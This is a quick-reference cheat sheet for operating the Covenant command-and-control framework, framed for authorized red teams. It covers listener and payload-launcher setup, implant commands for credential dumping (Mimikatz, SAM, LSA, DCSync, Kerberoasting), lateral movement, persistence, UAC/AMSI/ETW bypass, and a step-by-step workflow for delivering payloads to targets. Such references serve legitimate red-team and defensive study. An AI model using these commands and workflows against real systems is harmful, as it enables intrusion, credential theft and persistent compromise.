# Covenant C2 Framework Quick Reference

> **For authorized red team exercises only. C# .NET framework.**

---

## Installation & Setup

### Installation
```bash
# Clone repository
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant

# Build and run
dotnet build
dotnet run

# Access web interface
https://localhost:7443

# Docker installation
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant
```

### Initial Setup
```
1. Navigate to https://localhost:7443
2. Create admin user
3. Login to Covenant interface
```

---

## Covenant Web Interface

### Navigation
```
Dashboard                   # Overview
Listeners                   # C2 listeners
Launchers                   # Payload generators
Grunts                      # Active implants
Tasks                       # Task queue
Templates                   # Grunt templates
Users                       # User management
```

---

## Listeners

### HTTP Listener
```
Listeners -> Create
- Name: HTTP-80
- Type: HTTP
- ConnectAddresses: http://192.168.1.100
- BindAddress: 0.0.0.0
- BindPort: 80
```

### HTTPS Listener
```
Listeners -> Create
- Name: HTTPS-443
- Type: HTTP
- ConnectAddresses: https://192.168.1.100
- BindAddress: 0.0.0.0
- BindPort: 443
- UseSSL: True
- SSLCertificate: [Upload cert]
```

### Bridge Listener
```
Listeners -> Create
- Name: Bridge
- Type: Bridge
- ConnectAddresses: tcp://192.168.1.100:8080
- BindAddress: 0.0.0.0
- BindPort: 8080
```

---

## Launchers (Payload Generation)

### Binary Launcher
```
Launchers -> Create -> Binary
- Listener: HTTP-80
- ImplantTemplate: GruntHTTP
- Language: CSharp
- Architecture: x64
- Framework: Net40
- Generate & Download
```

### PowerShell Launcher
```
Launchers -> Create -> PowerShell
- Listener: HTTP-80
- ScriptLanguage: PowerShell
- DotNetFramework: Net40
- Generate code
```

### MSBuild Launcher
```
Launchers -> Create -> MSBuild
- Listener: HTTP-80
- TargetName: Build
- TaskName: Execute
- Generate XML file
```

### InstallUtil Launcher
```
Launchers -> Create -> InstallUtil
- Listener: HTTP-80
- Generate executable
```

### Regsvr32 Launcher
```
Launchers -> Create -> Regsvr32
- Listener: HTTP-80
- Generate SCT file
```

---

## Grunt Management

### Grunt Interaction
```
Grunts -> Select Grunt -> Interact
- View grunt details
- Execute tasks
- File operations
- Process management
```

### Basic Grunt Commands
```
# System information
Whoami                      # Current user
Hostname                    # Computer name
GetCurrentDirectory         # Current directory
GetDomainName              # Domain name
GetComputerName            # Computer name

# File operations
ChangeDirectory <path>      # Change directory  
ListDirectory [path]        # List files
Upload <local> <remote>     # Upload file
Download <remote>           # Download file
```

### Process Operations
```
ProcessList                 # List processes
GetProcess <pid>           # Get process info
Kill <pid>                 # Kill process
```

---

## Tasks & Modules

### Core Tasks
```
# Shell access
Shell <command>            # Execute shell command
PowerShell <command>       # Execute PowerShell
Assembly <assembly> <args> # Execute .NET assembly

# Network operations
PortScan <host> <ports>    # Port scanning
Ping <target>              # Ping host
```

### Credential Tasks
```
# Credential harvesting
Mimikatz <command>         # Execute Mimikatz
LogonPasswords             # Dump logon passwords
SamDump                    # Dump SAM database
LsaSecrets                 # Dump LSA secrets

# Kerberos attacks
Kerberoast                 # Kerberoasting
ASREPRoast                 # ASREPRoast attack
DCSync <user>              # DCSync attack
```

### Lateral Movement
```
# Remote execution
WMI <target> <command>     # WMI execution
PowerShellRemoting <target> <command> # PS remoting
OverpassTheHash <hash>     # Pass-the-hash

# SMB operations
SMBExecute <target> <command> # SMB execution
```

### Persistence
```
# Registry persistence
PersistenceRegistry <key> <value> # Registry persistence

# Scheduled tasks
PersistenceScheduledTask <name> <command> # Schtask persistence

# WMI persistence
PersistenceWMI <name> <command> # WMI persistence
```

### Privilege Escalation
```
# UAC bypass
BypassUAC <method>         # UAC bypass
PrivescCheck               # Privilege escalation check

# Token operations
GetSystem                  # Get SYSTEM token
ImpersonateUser <user>     # Impersonate user
RevertToSelf              # Revert token
```

---

## Advanced Features

### Grunt Templates
```
Templates -> View/Edit Grunt Templates
- GruntHTTP: Standard HTTP
- GruntHTTPS: HTTPS variant
- GruntSMB: SMB communication
- GruntTCP: TCP communication
```

### Custom Tasks
```
Tasks -> Create Custom Task
- Name: Custom task name
- Language: C#/PowerShell
- Code: Task implementation
```

### Data Protection
```
# Certificate-based authentication
Listeners -> Create -> HTTPS
- Upload SSL certificate
- Configure client certificates

# Encryption
All communications encrypted by default
Certificate pinning available
```

---

## Grunt Types & Communication

### HTTP Grunt
```
- Standard HTTP/HTTPS communication
- Customizable user agents
- Domain fronting support
- Malleable profiles
```

### SMB Grunt
```
- Named pipe communication
- Peer-to-peer networking
- No direct internet connection required
- Useful for internal pivoting
```

### TCP Grunt
```
- Direct TCP connection
- Low latency communication
- Reverse and bind connections
```

### Bridge Grunt
```
- Connects multiple communication methods
- Protocol translation
- Network segmentation bypass
```

---

## OPSEC Features

### Communication Security
```
# Certificate pinning
Listeners -> HTTPS -> Certificate Pinning

# Domain fronting
Listeners -> HTTP -> Use CDN/Redirector

# Jitter configuration
Grunts -> Configure -> Sleep/Jitter settings
```

### Process Security
```
# Process injection
Tasks -> Inject -> Target Process

# AMSI bypass
Built-in AMSI bypass techniques

# ETW bypass
Event Tracing for Windows bypass
```

### Traffic Obfuscation
```
# Custom profiles
Templates -> HTTP Profile Templates
- Custom headers
- URI patterns
- Response patterns

# Encryption
AES encryption for all traffic
RSA key exchange
```

---

## Scripting & Automation

### C# Task Development
```csharp
// Custom task example
public static class CustomTask
{
    public static string Execute(string args)
    {
        // Task implementation
        return "Task result";
    }
}
```

### PowerShell Integration
```powershell
# PowerShell task
PowerShell Get-Process
PowerShell Invoke-Mimikatz
PowerShell Import-Module PowerView; Get-DomainUser
```

### REST API
```bash
# API authentication
curl -X POST https://localhost:7443/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# Create listener via API
curl -X POST https://localhost:7443/api/listeners \
  -H "Authorization: Bearer <token>" \
  -d '{"name":"HTTP-API","bindAddress":"0.0.0.0","bindPort":8080}'
```

---

## Multi-User Environment

### User Management
```
Users -> Create User
- Username
- Password  
- Role (Administrator/User/Listener)
```

### Role-Based Access
```
Administrator: Full access
User: Limited grunt interaction
Listener: Listener management only
```

### Collaboration Features
```
- Real-time grunt sharing
- Task history viewing
- Concurrent operator support
- Activity logging
```

---

## Common Workflows

### Initial Deployment
```
1. Create HTTP listener
2. Generate Binary launcher
3. Deliver payload to target
4. Interact with grunt
5. Enumerate system
```

### Lateral Movement
```
1. Credential harvesting: Mimikatz
2. Target identification: PortScan
3. Lateral execution: WMI/PSRemoting
4. Deploy additional grunts
```

### Privilege Escalation
```
1. Check current privileges: Whoami
2. Enumerate escalation vectors: PrivescCheck
3. Attempt UAC bypass: BypassUAC
4. Get SYSTEM: GetSystem
```

### Persistence
```
1. Registry: PersistenceRegistry
2. Scheduled task: PersistenceScheduledTask  
3. WMI: PersistenceWMI
4. Test persistence: Reboot/logout test
```

---

## Troubleshooting

### Common Issues
```
# Grunt not connecting
- Check firewall rules
- Verify listener configuration
- Check network connectivity

# HTTPS certificate issues
- Use valid certificates
- Configure certificate pinning
- Check certificate chain

# Performance issues
- Adjust sleep/jitter settings
- Use appropriate grunt type
- Consider network latency
```

### Debug Information
```
Grunts -> Grunt Details -> Debug Info
- Connection status
- Last checkin time
- Error messages
- Task queue status
```

---

*Covenant is open source C# framework. Ensure proper authorization for all testing activities.*